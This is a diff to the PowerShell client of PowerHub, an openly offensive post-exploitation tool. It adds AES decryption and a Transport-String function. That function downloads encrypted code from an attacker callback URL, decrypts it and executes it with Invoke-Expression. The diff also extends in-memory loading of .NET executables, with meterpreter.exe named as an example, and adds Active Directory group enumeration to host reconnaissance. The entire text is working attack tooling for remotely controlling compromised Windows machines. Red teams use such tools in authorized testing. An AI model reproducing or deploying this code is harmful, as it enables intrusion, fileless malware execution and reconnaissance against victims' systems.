@@ -11,16 +11,13 @@ Write-Output @"
   _____   _____  _  _  _ _______  ______ _     _ _     _ ______
  |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
  |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
-                            written by Adrian Vollmer, 2018-2021
+                            written by Adrian Vollmer, 2018-2022
 Run 'Help-PowerHub' for help
 "@
 
 $CALLBACK_URL = ${{symbol_name("CALLBACK_URL")}}
 $KEY = ${{symbol_name("KEY")}}
 $WebClient = ${{symbol_name("WebClient")}}
-Set-Alias -Name Decrypt-Code -Value {{symbol_name("Decrypt-Code")}}
-Set-Alias -Name Decrypt-String -Value {{symbol_name("Decrypt-String")}}
-Set-Alias -Name Transport-String -Value {{symbol_name("Transport-String")}}
 
 $WEBDAV_URL = "{{webdav_url}}"
 $ErrorActionPreference = "Stop"
@@ -48,6 +45,44 @@ function Encrypt-AES {
     $fullData
 }
 
+function Decrypt-AES {
+    param(
+        [Byte[]]$buffer,
+        [Byte[]]$key
+  	)
+
+    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
+    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $aesManaged.BlockSize = 128
+    $aesManaged.KeySize = 128
+    $aesManaged.Key = [byte[]]$key[0..15]
+    $aesManaged.IV = [byte[]]$buffer[0..15]
+
+    $decryptor = $aesManaged.CreateDecryptor()
+    $decryptedData = $decryptor.TransformFinalBlock($buffer, 16, $buffer.Length-16);
+
+    try{$aesManaged.Dispose()}catch{} {# This method does not exist in PS2 #}
+    $decryptedData
+}
+
+function Decrypt-String {
+    param(
+        [System.String]$string, [Bool]$Code=$False
+  	)
+    $result = [System.Convert]::FromBase64String($string)
+    $result = Decrypt-AES $result $KEY
+    if (-not $Code) { $result = [System.Text.Encoding]::UTF8.GetString($result) }
+    $result
+}
+
+function Transport-String {
+    param([String]$1, [hashtable]$2=@{}, [Bool]$3=$False)
+    $args = "?t={{transport}}"
+    foreach($k in $2.keys) { $args += "&$k=$($2[$k])" }
+    return Decrypt-String ($WebClient.DownloadString("${CALLBACK_URL}${1}${args}")) $3
+}
+
 function Unzip-Code {
      Param ( [byte[]] $byteArray )
      if ($PS_VERSION -eq 2) {
@@ -66,7 +101,7 @@ function Unzip-Code {
 
 function Update-HubModules {
     $ModuleList = Transport-String "ml"
-    Invoke-Expression $ModuleList
+    Invoke-Expression "$ModuleList"
     $Global:PowerHubModules = $PowerHubModules
 }
 
@@ -377,6 +412,14 @@ This might trigger the anti-virus.
 
 A PowerHub module object of type 'exe' (must be a .NET exe).
 
+.PARAMETER OutFile
+
+Path to a file where the output is stored; by default output is printed to console
+
+The console is different than stdout for complicated PowerShell reasons.
+Use `-OutFile "-"` to redirect the output to stdout, i.e. the information stream.
+However, the output will be delayed and only printed when the program finished.
+
 .PARAMETER Arguments
 
 An array of strings that represent the arguments which will be passed to the executable
@@ -404,7 +447,9 @@ Load the .NET module with the name 'meterpreter.exe' in memory and run it
         [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
         [PSTypeName("PowerHub.Module")] $Module,
 
-        [parameter(Mandatory=$false)] [String[]] $Arguments
+        [parameter(Mandatory=$false)] [String] $OutFile,
+
+        [parameter(Mandatory=$false)] [String[]] $Arguments = @()
     )
 
     foreach ($m in $Module) {
@@ -412,7 +457,25 @@ Load the .NET module with the name 'meterpreter.exe' in memory and run it
         $a = [Reflection.Assembly]::Load([byte[]]$code)
         $al = New-Object -TypeName System.Collections.ArrayList
         $al.add($Arguments)
-        $a.EntryPoint.Invoke($Null, $al.ToArray());
+        if ($OutFile) {
+            $OldConsoleOut=[Console]::Out
+            if ($OutFile -eq '-') {
+                $StreamWriter=New-Object IO.StringWriter($OutFile)
+            } else {
+                $StreamWriter=New-Object IO.StreamWriter($OutFile)
+            }
+            [Console]::SetOut($StreamWriter)
+            try {
+                $a.EntryPoint.Invoke($Null, $al.ToArray())
+            } finally {
+                [Console]::SetOut($OldConsoleOut)
+            }
+        } else{
+            $a.EntryPoint.Invoke($Null, $al.ToArray())
+        }
+        if ($OutFile -eq '-') {
+            $StreamWriter.toString()
+        }
     }
 }
 
@@ -695,8 +758,13 @@ Return some basic information about the underlying system
     $IsAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
     try {
+        $Groups = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(samAccountName=$($env:username)))")).FindOne().GetDirectoryEntry().memberOf
+    } catch { $Groups = @() }
+
+    try {
         $admins = (Get-LocalGroupMember -Sid S-1-5-32-544);
     } catch { $admins = '?' }
+
     return  New-Object psobject -Property @{
         name = $SysInfo.name.split('|')[0];
         arch = $SysInfo.OSArchitecture;
@@ -707,6 +775,7 @@ Return some basic information about the underlying system
         username = $env:username;
         userdomain = $env:userdomain;
         isadmin = $IsAdmin;
+        groups = $Groups;
         admins = $admins;
         releaseid = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('ReleaseID');
         IPs = $IPs
